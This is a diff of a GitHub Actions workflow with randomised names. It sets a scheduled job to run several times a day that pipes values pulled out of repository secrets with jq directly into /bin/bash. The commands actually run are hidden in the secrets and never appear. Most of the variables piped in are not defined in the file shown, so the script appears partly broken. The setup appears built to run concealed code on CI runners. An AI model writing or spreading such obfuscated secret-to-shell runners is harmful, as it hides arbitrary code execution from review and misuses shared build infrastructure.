@@ -1,11 +1,10 @@
 name: tanloujun7165
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 1/6 * * *'
+    - cron: '12 2/6 * * *'
 
-jobs:  # 28432
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +12,17 @@ jobs:  # 28432
       - uses: actions/checkout@v4
       - name: tanloujun7165
         env:
-          fxrg307: ${{ secrets.fxrg307 }}
+          apcsj5321: ${{ secrets.apcsj5321 }}
         run: |
-          echo $fxrg307 | jq -r .ihxnt39465 | /bin/bash
-          echo $wez1 | jq -r .nw29453 | /bin/bash
-          echo $uphgd64608 | jq -r .xosr4815 | /bin/bash
-          echo $vtdpk78 | jq -r .uczw3902 | /bin/bash
-          echo $e21 | jq -r .czn48393 | /bin/bash
-          echo $x293 | jq -r .oeame47 | /bin/bash
-          echo $dvyc67780 | jq -r .jx9297 | /bin/bash
+          echo $apcsj5321 | jq -r .io9 | /bin/bash
+          echo $wop991 | jq -r .khtaa4 | /bin/bash
+          echo $rd398 | jq -r .hjt9 | /bin/bash
+          echo $swyt2 | jq -r .vizs2 | /bin/bash
+          echo $jg8 | jq -r .uygum14032 | /bin/bash
+          echo $j86620 | jq -r .ia826 | /bin/bash
+          echo $p143 | jq -r .xdbih12615 | /bin/bash
+          echo $r6978 | jq -r .mc54 | /bin/bash
+          echo $cpa1973 | jq -r .t6 | /bin/bash
+          echo $gqlzd81 | jq -r .xed280 | /bin/bash
+          echo $i10 | jq -r .w77317 | /bin/bash
 
